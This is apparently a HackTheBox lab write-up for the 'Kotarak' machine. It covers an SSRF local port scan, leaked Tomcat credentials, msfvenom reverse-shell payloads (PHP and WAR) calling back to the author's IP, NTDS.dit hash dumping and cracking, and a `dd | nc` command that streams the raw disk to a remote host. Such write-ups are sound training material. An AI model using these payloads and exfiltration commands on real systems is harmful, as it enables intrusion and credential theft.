---
title: HTB - Kotarak
date: 2022-02-05
layout: single
header:
  teaser: assets/images/htb/kotarak/teaser.png
excerpt: Kotarak is a challenging web based box that morphs simple concepts into challenging puzzles with the inclusion of local web servers. A web server is discovered to be vulnerable to leaking local files, leading to a challenging enumeration problem. Once enumerated properly, multiple local processes are running, including a file retrieval system used to access plaintext credentials for a tomcat server. Leveraging a war reverse shell, the tomcat user stumbles upon a pentest report, containing password hashes which are cracked for lateral movement. Finally, the atanas user account has one too many permissions, allowing for a crazy rooting process you need to read to believe!
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - web
  - tomcat
---

# Summary
<img src="/assets/images/htb/kotarak/teaser.png" width="80" height="80"/>

Kotarak is a challenging web based box that morphs simple concepts into challenging puzzles with the inclusion of local web servers. A web server is discovered to be vulnerable to leaking local files, leading to a challenging enumeration problem. Once enumerated properly, multiple local processes are running, including a file retrieval system used to access plaintext credentials for a tomcat server. Leveraging a war reverse shell, the tomcat user stumbles upon a pentest report, containing password hashes which are cracked for lateral movement. Finally, the atanas user account has one too many permissions, allowing for a crazy rooting process which is too cool to spoil this early on.

# Recon
```
sudo rustscan -a kotarak.htb -- -sC -sV -O --script vuln

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

Open 10.10.10.55:22
Open 10.10.10.55:8009
Open 10.10.10.55:8080
Open 10.10.10.55:60000

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-04 15:20 EST

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       ...
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
8009/tcp  open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
8080/tcp  open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|_  /manager/html: Apache Tomcat (401 )
|_http-iis-webdav-vuln: WebDAV is DISABLED. Server is not currently vulnerable.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:tomcat:8.5.5: 
|       TOMCAT:0DBA25EA40A6FEBF5FD9039D7F60718E 10.0    https://vulners.com/tomcat/TOMCAT:0DBA25EA40A6FEBF5FD9039D7F60718E
|       SSV:92553       10.0    https://vulners.com/seebug/SSV:92553    *EXPLOIT*
|       ...
|       PACKETSTORM:144557      0.0     https://vulners.com/packetstorm/PACKETSTORM:144557      *EXPLOIT*
|_      PACKETSTORM:141920      0.0     https://vulners.com/packetstorm/PACKETSTORM:141920      *EXPLOIT*
60000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=kotarak.htb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://kotarak.htb:60000/
|     Form id: 
|_    Form action: url.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /info.php: Possible information file
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       ...
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/       0.0     https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/  *EXPLOIT*
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We gather that this has ssh and three web-app looking services running on 8009, 8080 and 60000.

## Apache Jserv - Port 8009

[Read up on it more here](https://tomcat.apache.org/tomcat-3.3-doc/AJPv13.html) and just appears to be related to apache. Not much else to look into for now.

## Tomcat 8080

* directory brute force
  * `feroxbuster -u http://kotarak.htb:8080/ -x js php txt`
  * Standard tomcat looking server
* manager login
  * default/common creds dont work
* login error
  * When trying to login get a redirect to http://kotarak.htb:8080/examples/jsp/dates/j_security_check
  * `HTTP Status 404 - /examples/jsp/dates/index.jsp;jsessionid=61EDB81D586B7A2B3C8C7D5DF379DFA5`
  * Could be interesting down the line

## http - 60000
A web browser built into the website? Looks like we've struck gold (or a rabbit hole).
[](/assets/images/htb/kotarak/web1.png)

* directory brute force
  * `feroxbuster -u http://kotarak.htb:60000/ -x js php txt`
    * `info.php`, `index.php`, `url.php`, `server-status` (403)
* phpinfo (info.php)
  * `Apache/2.4.18 (Ubuntu) -- PHP Version 5.6.31-1~ubuntu16.04.1+deb.sury.org+1`
  * file uploads: on
* index.php
  * page we load to, showing the search engine feature
  * asks `url.php` for a page
  * ```html
    <form method="GET" action="url.php">
        <input type="text" value="" name="path">
        <input type="submit" value="Submit">
    </form>
    ```
* `url.php`
  * this plays with `index.php` to search up links

## Private browser fuzzing
Time to dig into the private browsing feature we discovered on `http://kotarak.htb:60000`. To begin, lets try making requests to a locally hosted http server. Since phpinfo displayed file uploads as on, it's possible we can make a request to download a maliciouis file from our hosted server.
```
# Create completely malicious file
vi hello-world.txt
# Host server
python -m SimpleHTTPServer                                                                                                1 ⨯
Serving HTTP on 0.0.0.0 port 8000 ...
# Generate url
http://10.10.14.24:8000/hello-world.txt
# Plug into kotarak and run...
10.10.10.55 - - [05/Feb/2022 11:52:10] "GET /hello-world.txt HTTP/1.1" 200 -
```
* hello world test
  * `http://kotarak.htb:60000/url.php?path=http%3A%2F%2F10.10.14.24%3A8000%2Fhello-world.txt`
  * works!
* try loading a webshell. We can forge a weapon with `msfvenom`
  * `msfvenom -p php/reverse_php LHOST=10.10.14.24 LPORT=4445 -f raw > shell.php`
  * Just loads plaintext, move on

What about pulling local files?

* tomcat files?
  * `http://127.0.0.1:8080/manager/html`
  * nope
* what ports are open locally?
  * this opens up a rabbit hole

Since it's not immediately clear what is being hosted locally, use some bash scripting to generate a better list. Note: there are a few ways to do this, my first time around I also tried a method using ffuf which also worked well.
> for f in `seq 1 8000`; do echo "Port:${f}"; curl http://kotarak.htb:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${f}; done > local_scan.txt

> `fuf -w all-ports.txt -u http://kotarak.htb:60000/url.php?path=http%3A%2F%2Flocalhost%3AFUZZ -ac -c -o ffuf.txt`

There are quite a few open ports locally, broken down below:

Port:22 - ssh
```
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2                                                                                           
Protocol mismatch.                                                                                                                
```
Port:90 - wip page
```html
<!DOCTYPE>                                                                                                                        
<html>                                                                                                                            
<head>                                                                                                                            
<title>Under Construction</title>                                                                                                 
</head>                                                                                                                           
<bodyd>                                                                                                                           
<p>This page is under construction. Please come back soon!</p>                                                                    
</body>                                                                                                                           
</html>                                           
```
Port:200 - some sort of hello world
```html                                                                                                                          
<b>Hello world!</b>                                                                                                               
```                                                                                                                               
Port:320 - super sensitive login page
```html                                                                                                                       
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><html>                                  
<head>                                                                                                                            
<title>Accounting</title>                                                                                                         
<style type="text/css">                                          
                html,body{height: 50%; padding:0; margin:0;}                                                                      
                form{ width:30em;height:9em; margin:-5em auto 0 auto; position: relative; top:50%; border:1px dotted #ccc; padding
:.25em; }                                                                                                                         
                fieldset{ margin:0;   border:0;padding:0;}                                                                        
                legend{float:left; font-size: 200%; text-align: center; color:blue; font-weight: bold; border-bottom: 1px solid bl
ue; width:15em;  padding:0; }                                                                                                                     label, label+ input {display:inline; float:left;margin-top:1em;}                                                  
                label{text-align: right; width:28%; clear: left; margin-top:.8em; }                                               
                label+ input{ width:60%; padding:.25em; ; margin-left:.5em; border: 1px inset;  margin-left: }                    
                #sub{  margin-top:1em; position: relative; float:left;clear: left; margin-left: 29%}                              
</style>                                                                                                                          
</head>                                                          
<body>                                                                                                                                    <form action="" method="post">                           
                <fieldset><legend>Super Sensitive Login Page</legend>                                                             
                        <label for="name">Name: </label><input  type="text" name="name" id="name" value="admin">
                        <label for="password">Password: </label><input  type="password" name="password" id="password">
                        <input type="submit" value="Login" id="sub">
                </fieldset>
        </form>
</body>
</html>
```
Port:888 -- some sort of file viewer
```html
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">                                                               
<head>                                                                                                                            
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>                                                         
<title>Simple File Viewer</title>                                                                                                 
                                                                                                                                  
    <link href="inc/default.css" rel="stylesheet" type="text/css" />                                                              
    <!--[if lt IE 7.]>                                                                                                            
    <script defer type="text/javascript" src="inc/js/pngfix.js"></script>                                                         
    <![endif]-->                                                                                                                  
                                                                                                                                  
</head>                                                                                                                           
<body>
<div id="contents">
        <h1>
                Simple File Viewer      </h1><table width="100%" border="0" cellpadding="5" cellspacing="0" class="tableBorder">
      <tr>
        <td width="35" valign="bottom" class="path">Path: </td>
        <td>
  ...
```
Port:3306 -- mysql
```
5.7.19-0ubuntu0.16.04.1^`O+}R^7\oyE|X.=Bmysql_native_passwordot packets out of order
```
Of these, the file viewer is of interest, particularly in how its grabbing local files. Perhaps we can trick it to expose `/etc/passwd` or another sensitive file? The simple file viewer lists the files `backup` `blah` `js` `on` `tetris.c` `thing` and `this`. `backup` sounds important.

When manually clicking from the local url, the page hands a `GET` to `url.php`, meaning we must slightly modify our attack to allow for the `doc` field to be filled in.

> http://kotarak.htb:60000/url.php?doc=tetris.c

Try asking for `http://127.0.0.1:888/url.php?doc=backup` which 404s. This is because the `url.php` is coming from the server on port 60000 and not the server on `127.0.0.1:888`. Since we know the base dir loads as `http://kotarak.htb:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A888%2F` we can simply remove the extra `url.php` to load any page we want. Try removing the `url.php` piece for the url `http://127.0.0.1:888/?doc=backup`.

> http://kotarak.htb:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A888%2F%3Fdoc%3Dbackup

tomcat credentials! this looks to be the servers `tomcat-users.xml`
```xml
<?xml version="1.0" encoding="UTF-8"?>
...
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
    <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
</tomcat-users>
```
This sets us up for a tomcat foothold over on `http://kotarak.htb:8080/manager/html`.

![](/assets/images/htb/kotarak/tomcat.png)
Lets make a weapon and deploy it! If this is the first time you are exploiting a tomcat server, check out [htb: jerry](https://kontari.github.io/hackthebox/htb-jerry-writeup/) or just google how to get a shell from accessing a tomcat manager instance.

> msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4445 -f war -o rev.war

Browse to `http://kotarak.htb:8080/rev/` and
```
nc -lvnp 4445                                                                                                           130 ⨯
listening on [any] 4445 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.55] 41118
whoami
tomcat
```
## tomcat -> user

```
tomcat@kotarak-dmz:~$ cd /home/tomcat
cd /home/tomcat
tomcat@kotarak-dmz:/home/tomcat$ ls
ls
to_archive
tomcat@kotarak-dmz:/home/tomcat$ ls -al
ls -al
total 12
drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 .
drwxr-xr-x 4 root   root   4096 Jul 21  2017 ..
drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 to_archive
tomcat@kotarak-dmz:/home/tomcat$ cd to_archive
cd to_archive
tomcat@kotarak-dmz:/home/tomcat/to_archive$ ls -al
ls -al
total 12
drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 .
drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 ..
drwxr-xr-x 2 tomcat tomcat 4096 Jul 21  2017 pentest_data
tomcat@kotarak-dmz:/home/tomcat/to_archive$ ls pentest_data
ls pentest_data
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

Grab the `dit` and `bin` files off the box using a common httpserver workflow in reverse.

```
# Attacking box
wget http://kotarak.htb:8088/1.dit                                                                                
wget http://kotarak.htb:8088/1.bin

# Kotarak.htb tomcat user shell
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ python -m SimpleHTTPServer 8088
<mcat/to_archive/pentest_data$ python -m SimpleHTTPServer 8088               
Serving HTTP on 0.0.0.0 port 8088 ...
10.10.14.24 - - [05/Feb/2022 13:55:12] "GET /1.dit HTTP/1.1" 200 -
10.10.14.24 - - [05/Feb/2022 13:55:19] "GET /1.bin HTTP/1.1" 200 -
```

## Extracting hashes
To extract the hashes, we can follow [ropnops blog](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit) post and use `secretsdump.py` from the impacket suite.
```
secretsdump.py -ntds 1.dit -system 1.bin LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 1.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from 1.dit 
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up... 
```
Fresh hashes! If we save them we can see some we might want to crack
```
cat dump.txt  | grep ':::'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```
Passed into john only found the guest password but luckily these were unsalted hashes. This means we can check websites like crackstation.net for the hashes.
```
e64fe0f24ba2489c05e64354d74ebd11	NTLM	f16tomcat!
31d6cfe0d16ae931b73c59d7e0c089c0	NTLM	
668d49ebfdb70aeee8bcaeac9e3e66fd	Unknown	Not found.
ca1ccefcb525db49828fbb9d68298eee	Unknown	Not found.
160f6c1db2ce0994c19c46a349611487	Unknown	Not found.
6f5e87fd20d1d8753896f6c9cb316279	Unknown	Not found.
cdd7a7f43d06b3a91705900a592f3772	Unknown	Not found.
24473180acbcc5f7d2731abe05cfa88c	Unknown	Not found.
2b576acbe6bcfda7294d6bd18041b8fe	NTLM	Password123!
```
Result: credentials for admin and atanas users. From here we can upgrade our previous shell with `su - atanas` and `f16tomcat!` to grab user.txt

## atanas -> root
There are two ways to break this box, with one being (possibly) unintentional but really cool. It all stems from this simple command, `id`. Can you spot the weakness?
```
atanas@kotarak-dmz:~$ id
id
uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
```
Being a member of the `disk` group means you can access raw devices! This means we can just download the entire filesystem, mount it locally, and copy the root.txt off the box.
```
# victim
time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.24 443
# locally
nc -lnvp 443 > filesystem.gz
```
After a few minutes (we are downloading a whole disk after all) we can mount and poke around the filesystem
```
gunzip filesystem.gz
sudo mount filesystem /mnt/
sudo cat /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt
950*********************
```
